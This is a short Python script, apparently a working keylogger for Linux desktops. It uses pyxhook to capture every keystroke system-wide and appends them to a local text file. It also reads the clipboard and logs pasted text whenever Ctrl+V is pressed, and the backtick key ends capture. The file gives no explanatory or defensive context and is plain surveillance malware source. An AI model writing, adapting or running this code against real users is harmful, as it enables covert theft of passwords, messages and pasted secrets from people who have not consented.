import pyxhook
import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, Gdk

log_file = 'file.txt'
cb = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
ctrl_set = 0


def kb_event(event):

    global ctrl_set
    special_keys = ['Shift_L', 'Shift_R', 'Control_L', 'Control_R',
                    'Alt_L', 'Alt_R', 'Super_L', 'Super_R', 'Escape',
                    'Insert', 'Delete', 'Print', 'Up', 'Down', 'Left', 'Right', 'Caps_Lock']
    f = open(log_file, 'a')

    if event.Key == 'Return':
        f.write("\n")
        ctrl_set = 0

    elif event.Key == 'space':
        f.write(" ")
        ctrl_set = 0

    elif event.Key == 'BackSpace':
        f.write("<-")
        ctrl_set = 0

    elif event.Key.startswith('Control'):
        f.write(" <Ctrl> ")
        if ctrl_set == 0:
            ctrl_set = 1

    elif event.Key == 'v' or event.Key == 'V':
        content = cb.wait_for_text()
        if ctrl_set == 1:
            f.write("Paste: " + content)
            ctrl_set = 0
        else:
            f.write(event.Key)

    elif event.Key in special_keys:
        f.write(" <" + event.Key + "> ")
        ctrl_set = 0

    elif event.Ascii == 96:  # grave(`)
        f.close()
        hookman.cancel()
    else:
        f.write(event.Key)
        ctrl_set = 0


hookman = pyxhook.HookManager()
hookman.KeyDown = kb_event
hookman.HookKeyboard()
hookman.start()
